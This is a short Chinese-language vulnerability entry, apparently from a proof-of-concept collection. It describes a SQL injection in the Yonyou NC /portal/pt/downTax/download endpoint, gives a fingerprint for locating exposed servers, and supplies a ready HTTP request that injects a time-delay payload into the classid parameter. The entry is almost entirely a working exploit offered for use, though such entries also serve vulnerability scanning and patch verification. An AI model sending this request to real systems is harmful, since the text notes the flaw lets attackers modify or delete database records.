﻿# 用友NC-SQL注入-download

> 更新时间：2024-05-20

> 漏洞编号：

> 漏洞说明： 用友NC download接口处存在 SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  

> 漏洞特征：app="用友-UFIDA-NC"

> 验证脚本：HTTP

```
GET /portal/pt/downTax/download?classid=1';WAITFOR+DELAY+'0:0:8'--&pageId=login HTTP/1.1
```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友NC-SQL注入-download.poc

